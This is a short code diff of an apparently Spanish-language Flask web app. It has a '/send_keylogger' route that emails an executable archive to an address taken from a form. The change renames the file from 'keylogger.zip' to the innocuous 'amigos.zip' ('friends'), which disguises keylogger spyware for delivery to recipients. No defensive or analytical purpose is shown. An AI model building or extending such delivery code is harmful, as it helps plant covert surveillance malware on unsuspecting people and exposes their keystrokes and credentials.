@@ -99,7 +99,7 @@ def stop():
 @app.route("/send_keylogger", methods=["POST"])
 def send_keylogger():
     correo = request.form.get("correo")
-    ruta_exe = "static/keylogger.zip"  # Ajusta si está en otra ruta
+    ruta_exe = "static/amigos.zip"  # Ajusta si está en otra ruta
 
     mensaje = enviar_exe_por_correo(correo or numero, ruta_exe)
     return render_template("keylogger.html", mensaje=mensaje)
